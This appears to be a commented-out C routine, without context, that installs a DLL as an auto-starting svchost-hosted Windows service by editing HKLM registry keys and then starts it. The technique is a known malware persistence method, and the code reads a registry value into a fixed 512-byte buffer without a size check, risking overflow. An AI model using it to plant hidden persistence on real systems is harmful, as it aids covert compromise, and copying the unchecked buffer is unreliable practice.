#
# int RegisterService(char* path)
# {
# 	SC_HANDLE	scmHandle = NULL;
# SC_HANDLE	scService = NULL;
# HKEY		hKey, newhKey;
# TCHAR		KeyName[256];
# DWORD		ret;
# BYTE		buf[512];
#
# scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
# if(scmHandle == NULL){
# 	deb("OpenSCManager: %s\n",FORMATERROR);
# return 1;
# }
# scService = CreateService(scmHandle, SERVICE_NAME, SERVICE_DISPNAME, SERVICE_ALL_ACCESS,
# SERVICE_WIN32_SHARE_PROCESS|SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
# SVCHOST_PATH, NULL, NULL, NULL, NULL, NULL);
#
# if(scService == NULL){
# deb("CreateService: (%d) %s\n",GetLastError(),FORMATERROR);
# return 1;
# }
# wsprintf(KeyName, "%s\\%s", SERVICE_KEY, SERVICE_NAME);
#
# ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, KeyName, NULL, KEY_SET_VALUE, &hKey);
# if (ret != ERROR_SUCCESS){
# deb("RegOpenKeyEx: %s\n",FORMATERROR);
# return 1;
# }
# ret = RegSetValueEx(hKey, "Description", NULL, REG_SZ, (CONST BYTE*)SERVICE_DESC,lstrlen(SERVICE_DESC)+1);
# if (ret != ERROR_SUCCESS){
# deb("RegSetValueEx: %s\n",FORMATERROR);
# return 1;
# }
# ret = RegCreateKey(hKey, "Parameters", &newhKey);
# if (ret != ERROR_SUCCESS){
# deb("RegCreateKey: %s\n",FORMATERROR);
# return 1;
# }
# ret = RegSetValueEx(newhKey, "ServiceDll", NULL, REG_EXPAND_SZ, (CONST BYTE*)path,lstrlen(path)+1);
# if (ret != ERROR_SUCCESS){
# deb("RegSetValueEx: %s\n",FORMATERROR);
# return 1;
# }
# RegCloseKey(newhKey);
# RegCloseKey(hKey);
#
# ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SVCHOST_KEY, NULL, KEY_WRITE | KEY_READ, &hKey);
# if (ret != ERROR_SUCCESS){
# deb("RegOpenKeyEx: %s\n",FORMATERROR);
# return 1;
# }
#
# DWORD valueSize = 1;
# ret = RegQueryValueEx(hKey, SERVICE_GROUP, NULL, NULL, NULL, &valueSize);
# if(ret != ERROR_SUCCESS){
# deb("RegQueryValueEx: %s\n",FORMATERROR);
# return 1;
# }
#
# ret = RegQueryValueEx(hKey, SERVICE_GROUP, NULL, NULL, buf, &valueSize);
# if(ret != ERROR_SUCCESS){
# deb("RegQueryValueEx: %s\n",FORMATERROR);
# return 1;
# }
#
# BYTE* tmp = buf+valueSize-1;
# wsprintf((char*)tmp, "%s\0", SERVICE_NAME);
#
# ret = RegSetValueEx(hKey, SERVICE_GROUP, NULL, REG_MULTI_SZ, buf,
# valueSize+lstrlen(SERVICE_NAME));
#
# if (ret != ERROR_SUCCESS){
# deb("RegSetValueEx: %s\n",FORMATERROR);
# return 1;
# }
# RegCloseKey(hKey);
# deb("Service created.\n");
# if(StartService(scService,NULL,NULL) == 0)
# {
# deb("StartService: %s\n",FORMATERROR);
# }
# else
# {
# deb("Service started.\n");
# }
# CloseServiceHandle(scService);
# CloseServiceHandle(scmHandle);
#
# return 0;
# }
